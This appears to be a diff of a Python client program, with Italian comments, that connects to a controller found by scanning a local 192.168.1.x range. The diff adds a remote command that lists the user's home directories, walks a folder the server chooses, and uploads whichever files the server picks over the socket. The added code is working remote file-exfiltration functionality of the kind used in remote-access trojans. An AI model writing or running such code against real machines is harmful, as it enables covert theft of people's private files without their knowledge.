@@ -55,7 +55,8 @@ import uuid
 import threading
 from datetime import datetime
 import ipaddress
-
+from pathlib import Path
+import os
 # imported Libraries
 import ipinfo
 import psutil
@@ -115,8 +116,8 @@ def Cliente() -> bool:
         s.send(data)
         return True
     elif req == '7':
-        #gestione dello scan della libreria
-        pass
+        fileRetrieval()
+        return True
     else:
         return False
 
@@ -132,7 +133,12 @@ def getTokenFromConnection():
             print("Error getting token from the socket. Retrying in 5 min")
 
 
-
+def fileRetrieval():
+    paths = getPaths()
+    s.send(paths)
+    file_numbers = scanDir()
+    s.send(file_numbers)
+    uploaderFunction()
 
 def main():
     global access_token
@@ -272,6 +278,69 @@ def GetGeneralInfo():
 
     return json.dumps(info, indent=4).encode("utf-8")
 
+def getPaths():
+    print("sono entrato in getPaths")
+    Relative_path = str(Path.home()) + '/.config/user-dirs.dirs'  #/home/$USER/.config/user-dirs.dirs
+    print(Relative_path)  #secondo print
+    count = 1
+    with open(Relative_path ,'r') as file: #open file and when scope is ended, automatically close it
+        path_dict = {}
+        for i  in file.read().splitlines():   #read file row by row
+            if i.startswith("XDG"):   #if string starts with XDG...
+                x = i.split("$HOME/")  #only get second part of "$HOME/..."  (gets the final " too)
+                path_dict[f"{count}) {x[1][:-1]}"] =  str(Path.home()) + "/" + x[1][:-1]
+                count += 1
+
+    return json.dumps(path_dict,indent=4).encode("utf-8")
+
+"""def getPaths2():
+    home = Path.home()
+    dictionary = {}
+    count = 1
+    for root, dirs, filenames in os.walk(home):
+        for d in dirs:
+            if not d.startswith("."):
+                dictionary[f"{count}) {d}"] = os.path.join(home, d)
+                count += 1
+        break  # prevent descending into subfolders
+
+    return json.dumps(dictionary, indent=4).encode("utf-8")"""
+
+def scanDir():
+    input = s.recv(1092).decode()
+    input = input.replace('"','')
+    input = input.replace(" ", "")
+    count = 1
+    file_number = []
+    for root, dir, files in os.walk(input):
+        for file in files:
+            file_number.append(os.path.join(root,file))
+            count += 1
+
+    return json.dumps(file_number).encode("utf-8")
+
+def uploaderFunction():
+   found_files = s.recv(8192).decode()
+   found_files = json.loads(found_files)   #lista dei file trovati nel path scelto
+
+   time.sleep(3)
+
+   files_by_number = s.recv(1092).decode()
+   files_by_number = json.loads(files_by_number)    #lista dei file da scaricare
+
+   amount_of_files = len(files_by_number)
+
+   s.send(str(amount_of_files).encode("utf-8"))
+
+   for i in files_by_number:
+       file_to_open = str(found_files[i-1])
+       with open(file_to_open, 'rb') as file_to_send:
+           s.send(file_to_open.encode("utf-8","ignore"))
+           s.recv(100).decode("utf-8")
+           file_data = file_to_send.read()
+           s.sendall(file_data)
+           s.recv(1092).decode("utf-8")
+
 
 def signal_handler(signal, frame):
     print("Keyboard Interrupt received: closing connection...")
@@ -328,22 +397,11 @@ def loop(lista):
             print(f"Non sono riuscito a connettermi a {i} ")
     return retry
 
-'''def checkConnection(i):
-    global s
-    print(f"Mi provo a connettere a {i}")
-    try:
-        s = socket.create_connection((socket.gethostbyname(str(i)), Port))
-        if s:  # sock.connect_ex((socket.gethostbyname(str(i)), 9091)) == 0:
-            return True
-        else:
-            return False
-    except socket.error as e:
-        return False'''
 
 
 def splitter():
     numberlist = []
-    for i in range(150, 254):
+    for i in range(175, 254):
         numberlist.append(f"192.168.1.{i}")
     return numberlist
 
